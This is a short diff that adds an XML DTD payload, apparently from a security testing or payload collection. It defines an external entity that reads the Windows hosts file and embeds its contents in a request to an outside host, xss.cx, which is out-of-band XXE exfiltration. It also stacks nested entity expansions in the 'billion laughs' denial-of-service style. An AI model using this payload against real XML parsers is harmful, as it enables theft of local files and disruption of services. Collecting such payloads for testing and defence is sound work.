@@ -1,0 +1,5 @@
+<!ENTITY % p1 SYSTEM "file:///WINDOWS/system32/drivers/etc/hosts">
+<!ENTITY % lol "<!ENTITY e1 SYSTEM 'https://xss.cx/?%p1;'>">
+<!ENTITY % lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY % lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+&lol3;
